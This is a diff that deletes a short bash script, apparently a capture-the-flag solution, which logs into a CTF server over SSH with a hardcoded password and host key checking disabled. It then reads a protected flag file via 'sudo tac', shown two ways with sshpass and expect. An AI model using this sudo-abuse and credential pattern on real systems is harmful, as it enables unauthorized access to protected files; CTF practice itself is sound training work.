@@ -1,9 +1,0 @@
-#!/bin/bash
-
-password="reverse-kitten-0"
-remote=ctf@141.85.224.157
-remote_port=2232
-
-# Two ways to extract flag through SSH. That's how cool and smart we are.
-sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$remote" -p "$remote_port" "cd /home/ctf; sudo /usr/bin/tac flag"
-expect -c 'spawn ssh '"$remote"' -p '"$remote_port"' "cd /home/ctf; sudo /usr/bin/tac flag"; expect "assword:"; send "'"$password"'\r"; interact'
